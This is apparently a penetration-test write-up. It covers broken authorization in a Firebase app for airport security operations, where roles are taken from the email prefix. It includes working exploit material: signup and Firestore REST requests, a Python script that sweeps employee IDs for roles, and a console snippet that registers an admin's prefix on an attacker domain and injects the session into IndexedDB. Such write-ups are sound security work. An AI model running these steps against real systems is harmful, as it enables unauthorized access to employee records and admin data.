---
title: From Zero to System Admin on a Firebase App - Broken Auth Logic
author: S41F
date: 2026-09-01
categories: [Web Security, Firebase]
tags: [Firebase, Authorization, Broken Access Control, Firestore, Privilege Escalation]
---

## Intro

Most Firebase writeups focus on the auth layer, open signup, email verification bypass, enumeration, stealing tokens from IndexedDB. On this engagement the interesting bug wasn't in the auth layer. It was in the authorization logic the app built on top of Firebase, specifically how it decided *which employee you are* from a value the attacker fully controls.

The target was a company that has a platform for airport security operations services. Two portals (Sky Marshal and Ground Security), a login screen asking for an employee ID and a PIN, and a Firebase backend behind it (Auth + Firestore + Storage). I started with just the URL, no account. By the end I had a session the app treated as the **system administrator**, with read access to every employee record, every operational report, and the admin only collections.


---

## 1. Recon

First thing I always check on an app like this: what's the backend? Firebase apps are easy to spot, they hand you their whole config on a fixed path:

```bash
curl -s https://<target>/__/firebase/init.json | jq
```

```json
{
  "apiKey":            "AIzaSy‑‑REDACTED‑‑",
  "authDomain":        "<project>.firebaseapp.com",
  "projectId":         "<project>",
  "storageBucket":     "<project>.firebasestorage.app",
  "messagingSenderId": "REDACTED",
  "appId":             "1:REDACTED:web:REDACTED"
}
```

That single file confirms Firebase Auth and provides the Web API key I need for every request in the following sections. The key isn't a secret, it's shipped to the browser on purpose. It just identifies the project on Google's side.

---

## 2. Getting a foothold, open signup

The login UI only gives you "employee ID + PIN". No register button anywhere, it's an internal tool, accounts are supposed to be created by an admin. But the Firebase signup endpoint doesn't care about the UI, and open email/password signup was left on (that's the Firebase default and people forget to turn it off).

```http
POST /v1/accounts:signUp?key=AIzaSy‑‑REDACTED HTTP/2
Host: identitytoolkit.googleapis.com
Content-Type: application/json

{"email":"a@a.com","password":"Passw0rd!","returnSecureToken":true}
```

```http
HTTP/2 200 OK

{
  "kind": "identitytoolkit#SignupNewUserResponse",
  "idToken": "eyJhbGciOi...REDACTED",
  "refreshToken": "AMf-vB...REDACTED",
  "localId": "uGxv4a8REDACTED",
  "email": "a@a.com",
  "expiresIn": "3600"
}
```

200 OK. Now I'm authenticated, as a nobody, but authenticated. That `idToken` is what unlocks Firestore for the rest of the test. Token lives one hour, keep that in mind, I got bitten by expiry a few times later.

---

## 3. Reading the app's JS instead of guessing

I don't like guessing collection names, so I pulled the bundles and read them. Grabbed the HTML, pulled the script paths, then fetched each one:

```bash
curl -s https://***-security-reports.web.app/ -o index.html
grep -oE '(src|href)="[^"]+"' index.html

curl -s "https://***-security-reports.web.app/js/app.js?v=2.35.9"       -o app.js
curl -s "https://***-security-reports.web.app/js/firestore.js?v=2.35.9" -o firestore.js

etc...
```

Then just grep for the interesting stuff, collection names, role checks, anything auth related:

```bash
grep -noE 'collection\(db,[^)]*\)|doc\(db,[^)]*\)' firestore.js
grep -niE 'signInWithEmail|createUser|split\(|role|admin|uid' app.js auth.js
```

Two files told the whole story. First the login path, in `auth.js`:

```javascript

login: async (id, code) => {
  const email = `${id}@security.local`;
  return signInWithEmailAndPassword(auth, email, code);
}
```

So the "employee ID + PIN" box is literally `signInWithEmailAndPassword("<id>@security.local", "<pin>")`. Domain is hardcoded, the PIN is the Firebase password. Remember this, it matters a lot in section 6.

Then the important one, the session bootstrap in `app.js` that runs on every auth state change:

```javascript

onAuthStateChanged(auth, async (user) => {
  const employeeId = user.email.split('@')[0];   // <-- HERE'S THE MEOW xD
  const skyData    = await DB.getEmployeeById(employeeId);

  employeeData.roles       = skyData.roles;        // trusted as-is
  employeeData.permissions = skyData.permissions;  // trusted as-is
  window.currentUserData   = employeeData;
});
```

Look at that first line. The app takes the part of your email *before* the `@`, treats it as your employee number, loads that employee doc, and takes its roles and permissions as yours. It never checks the domain. It never checks you're actually that employee.

That's the core of it. Firebase authenticated "you own some email". The app then read the prefix of that email and turned it into an authorization decision. Two completely different things, glued together. Everything after this is just me abusing that.

---

## 4. Proving the Firestore rule with a 403 vs 404

The client trusting the prefix is only half of it. Firestore rules are the real gate, so I wanted to see if the backend honored the same logic. Easy test. Sign up as `1000@a.com`, grab the token, then read two docs, one that matches my prefix and one that doesn't.

First the signup, so my email prefix is `1000`:

```http
POST /v1/accounts:signUp?key=AIzaSy‑‑REDACTED HTTP/2
Host: identitytoolkit.googleapis.com
Content-Type: application/json

{"email":"1000@a.com","password":"Passw0rd!","returnSecureToken":true}
```

```http
HTTP/2 200 OK

{
  "idToken": "eyJhbGciOi...REDACTED",
  "refreshToken": "AMf-vB...REDACTED",
  "localId": "REDACTEDuid",
  "email": "1000@a.com",
  "expiresIn": "3600"
}
```

Now read a doc whose ID does **not** match my prefix:

```http
GET /v1/projects/***-security-reports/databases/(default)/documents/employees/uGxv4a8REDACTED HTTP/2
Host: firestore.googleapis.com
Authorization: Bearer eyJhbGciOi...REDACTED
```

```http
HTTP/2 403 Forbidden

{ "error": { "code": 403, "status": "PERMISSION_DENIED",
             "message": "Missing or insufficient permissions." } }
```

And a doc whose ID **does** match my prefix (`1000`):

```http
GET /v1/projects/***-security-reports/databases/(default)/documents/employees/1000 HTTP/2
Host: firestore.googleapis.com
Authorization: Bearer eyJhbGciOi...REDACTED
```

```http
HTTP/2 404 Not Found

{ "error": { "code": 404, "status": "NOT_FOUND",
             "message": "Document ... /employees/1000 was not found." } }
```

That 403 vs 404 is the tell. 403 means the rule blocked me. 404 means the rule *let me in* and there just wasn't a document there. So the rule is basically "you can read `employees/{id}` if `{id}` equals your email prefix". Which is no access control at all, because I pick my own prefix.

So now the plan is obvious: whatever employee I want to read, register that prefix first, then read.

---

## 5. Finding the real employee IDs (and the admins)

I can read any employee I name, but I need real numbers, and I need to know which ones are worth impersonating.

The `announcements` collection was readable by any logged in user, and each announcement had its author's employee ID on it. So I ran a query against it and looked at the `authorId` values that came back:

```http
POST /v1/projects/***-security-reports/databases/(default)/documents:runQuery HTTP/2
Host: firestore.googleapis.com
Authorization: Bearer eyJhbGciOi...REDACTED
Content-Type: application/json

{"structuredQuery":{"from":[{"collectionId":"announcements"}],"limit":100}}
```

The response was full of announcement docs; I just pulled the distinct `authorId` fields out of it.

Two IDs kept coming back as the authors of system wide notices. Good sign those are the privileged ones. Doing this by hand for every candidate got old fast, so I wrote a small Python script to sweep a range: sign up the prefix account, read the employee doc, print the roles.

```python
import requests

API_KEY = "AIzaSy‑‑REDACTED"
PROJECT = "***-security-reports"

SIGNUP = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}"
BASE   = f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents"


def get_token(emp_id):
    
    r = requests.post(SIGNUP, json={
        "email": f"{emp_id}@a.com",
        "password": "Passw0rd1",
        "returnSecureToken": True,
    })
    return r.json().get("idToken")


def get_roles(emp_id, token):
    r = requests.get(f"{BASE}/employees/{emp_id}",
                     headers={"Authorization": f"Bearer {token}"})
    doc = r.json()
    if "fields" not in doc:
        return None
    roles = doc["fields"].get("roles", {}).get("arrayValue", {}).get("values", [])
    return [x["stringValue"] for x in roles]



for emp_id in range(14640, 14701):
    token = get_token(emp_id)
    if not token:
        print(emp_id, "[taken]")
        continue

    roles = get_roles(emp_id, token)
    if roles is None:
        continue 

    print(emp_id, "roles=" + ",".join(roles))
```

Output:

```
...
14662 roles=security_officer,supervisor,admin
15144 roles=security_officer,supervisor,admin,system_admin
...
```

There we go. `14662` is an admin, and `15144` is the only `system_admin` in the place. That's the one I want.

---

## 6. The dead ends (this part is the actual lesson)

Before the clean win, I burned time on two things that didn't work, and understanding *why* they failed is the whole point.

### Dead end 1: just log in as 15144 with the default PIN

While reading employee docs I noticed a `personalCode` field, and for basically every seeded user it was `123456`. Regular users log in fine with `123456`. So my first instinct was, cool, log in as `15144` with `123456` on the Sky Marshal portal.

Nope. "خطأ في تسجيل الدخول" (login error). Tried it a few ways, kept failing.

Here's why, and it took me re-reading `auth.js` to get it. The login does NOT check `personalCode` from Firestore. It does this:

```javascript
signInWithEmailAndPassword("15144@security.local", "123456");
```

It checks the PIN against the **Firebase Auth password** for `15144@security.local`. Now the reason `123456` works for normal users is the *register* path. First time a normal user logs in, the app doesn't have an Auth account for them yet, so it creates one:

```javascript

register: async (id, code) => {
  const email = `${id}@security.local`;
  await createUserWithEmailAndPassword(auth, email, code);  // password = the PIN they typed
  ...
}
```

So for a normal user, "login with 123456" really means "create `<id>@security.local` with password 123456, then sign in". Their PIN works because *they set it themselves* on first use.

The admin `15144@security.local` already exists though. It was created ahead of time with a real password that is NOT `123456`. When I try to register it, Firebase just refuses:

```http
POST /v1/accounts:signUp?key=AIzaSy‑‑REDACTED HTTP/2
Host: identitytoolkit.googleapis.com
Content-Type: application/json

{"email":"15144@security.local","password":"Passw0rd1","returnSecureToken":true}
```

```http
HTTP/2 400 Bad Request

{ "error": { "code": 400, "message": "EMAIL_EXISTS",
             "errors": [{ "message": "EMAIL_EXISTS", "domain": "global", "reason": "invalid" }] } }
```

`EMAIL_EXISTS`. So I can't re-register it and pick my own password, and I don't know the real one. The front door as `15144` is genuinely closed. `personalCode` in the database is a red herring for the actual login flow.


### Dead end 2: just PATCH my own role to admin

Second idea, if I can read employee docs, maybe I can write one. Let me just PATCH my own doc's roles to `system_admin`:

```http
PATCH /v1/projects/***-security-reports/databases/(default)/documents/employees/uGxv4a8REDACTED?updateMask.fieldPaths=roles HTTP/2
Host: firestore.googleapis.com
Authorization: Bearer eyJhbGciOi...REDACTED
Content-Type: application/json

{
  "fields": {
    "roles": { "arrayValue": { "values": [
      { "stringValue": "system_admin" },
      { "stringValue": "admin" }
    ]}}
  }
}
```

```http
Response:
{ "error": { "code": 403, "status": "PERMISSION_DENIED",
             "message": "Missing or insufficient permissions." } }
```

The rules allow reads on matching prefix but not writes, so no self-promotion there. I also tried `accounts:update` to just change my throwaway account's email to `15144@a.com`, thinking I'd shortcut the prefix, but that ran into the same taken-email / logic issues and wasn't needed anyway.

The point of showing these: the win in the next section isn't the first thing you try. The prefix trust is the weak spot, everything else is properly locked.

---

## 7. Becoming the admin

Back to the one thing that actually is broken, the email prefix. The login form forces `@security.local`, but the *code that assigns roles* (`app.js`, section 3) only looks at the prefix and ignores the domain completely. So I register `15144` on a domain I own. `@security.local` is taken, `@anything-else` is wide open.

Two moves.

**Move 1, register the admin's prefix on my own domain:**

```http
POST /v1/accounts:signUp?key=AIzaSy‑‑REDACTED HTTP/2
Host: identitytoolkit.googleapis.com
Content-Type: application/json

{"email":"15144@attacker.tld","password":"Passw0rd1!","returnSecureToken":true}
```

```http
HTTP/2 200 OK

{
  "kind": "identitytoolkit#SignupNewUserResponse",
  "idToken": "eyJ...REDACTED",
  "refreshToken": "AMf-...REDACTED",
  "localId": "REDACTEDuid",
  "email": "15144@attacker.tld",
  "expiresIn": "3600"
}
```

Now I have a fully valid Firebase session whose prefix is `15144`. As far as `app.js` is concerned, I'm employee 15144.

If all you want is the data, you're basically done, that idToken is a valid bearer token and you can hit the Firestore REST API with it directly. But I wanted the actual admin dashboard rendered in the browser, so I needed the app to pick up this session.

**Move 2, hand the session to the running app.** Firebase Web SDK v9+ stores the logged in user in IndexedDB, in a db called `firebaseLocalStorageDb`. Write a record there, reload, and `onAuthStateChanged` fires with my user. I did the signup and the IndexedDB write in one console snippet so the token and uid always line up:

```javascript
(async () => {
  const apiKey = "AIzaSy‑‑REDACTED";
  const email  = "15144@attacker" + Math.floor(Math.random()*1e6) + ".tld";
  const password = "Passw0rd1!";

 
  const r = await fetch(
    `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${apiKey}`,
    { method:"POST", headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({ email, password, returnSecureToken:true }) });
  const d = await r.json();
  if (!d.idToken) { console.error("signUp failed", d); return; }

  
  const now = Date.now();
  const key = `firebase:authUser:${apiKey}:[DEFAULT]`;
  const value = {
    uid: d.localId, email, emailVerified:false, isAnonymous:false,
    providerData: [{ providerId:"password", uid:email, displayName:null,
                     email, phoneNumber:null, photoURL:null }],
    stsTokenManager: { refreshToken:d.refreshToken, accessToken:d.idToken,
                       expirationTime: now + 3600*1000 },
    createdAt: String(now), lastLoginAt: String(now),
    apiKey, appName:"[DEFAULT]"
  };

  
  const db = await new Promise((res,rej)=>{
    const q = indexedDB.open("firebaseLocalStorageDb");
    q.onsuccess=()=>res(q.result); q.onerror=()=>rej(q.error); });
  await new Promise((res,rej)=>{
    const tx = db.transaction("firebaseLocalStorage","readwrite");
    tx.objectStore("firebaseLocalStorage").put({ fbase_key:key, value });
    tx.oncomplete=res; tx.onerror=()=>rej(tx.error); });

  console.log("injected as", email, "reloading");
  location.reload();
})();
```

Reload, and the app resolves `15144`, loads the admin doc, and flips into admin mode. `window.currentUserData` in the console confirms it:

```json
{
  "id": "15144",
  "name": "<REDACTED>",
  "department": "sky_marshal",
  "roles": ["security_officer","supervisor","admin","system_admin"],
  "permissions": {
    "viewGreen": true, "viewYellow": true, "viewOrange": true, "viewRed": true,
    "canApprove": true, "canRequestClarify": true, "canBroadcast": true,
    "airside_manage": true, "finance_entitlements_manage": true
  },
  "uid": "REDACTEDuid"
}
```

The header shows the admin's name with a little crown, and the dashboard is now the central admin console. Employee management, permission assignment, broadcasts, audit log, system settings. All the collections that gave me 403 errors throughout the test suddenly return data.


With admin context, I confirmed reads on the stuff that was locked before, audit logs, the full reports collection, `settings/finance`, all of it:

```http
GET /v1/projects/***-security-reports/databases/(default)/documents/auditLogs?pageSize=25 HTTP/2
Host: firestore.googleapis.com
Authorization: Bearer eyJ...REDACTED (15144-prefix token)
```

```http
HTTP/2 200 OK

{
  "documents": [
    {
      "name": "projects/***-security-reports/databases/(default)/documents/auditLogs/REDACTED",
      "fields": {
        "action":    { "stringValue": "FINANCE_TOPIC_CREATED" },
        "actorId":   { "stringValue": "15144" },
        "timestamp": { "timestampValue": "2026-08-28T14:00:40.273Z" }
      }
    },
    { "...": "more entries redacted" }
  ]
}
```

```http
GET /v1/projects/***-security-reports/databases/(default)/documents/settings/finance HTTP/2
Host: firestore.googleapis.com
Authorization: Bearer eyJ...REDACTED (15144-prefix token)
```

```http
HTTP/2 200 OK

{
  "name": "projects/***-security-reports/databases/(default)/documents/settings/finance",
  "fields": {
    "iqdRate": { "integerValue": "1320" },
    "usdRate": { "integerValue": "13" }
  }
}
```

---

S41F ~
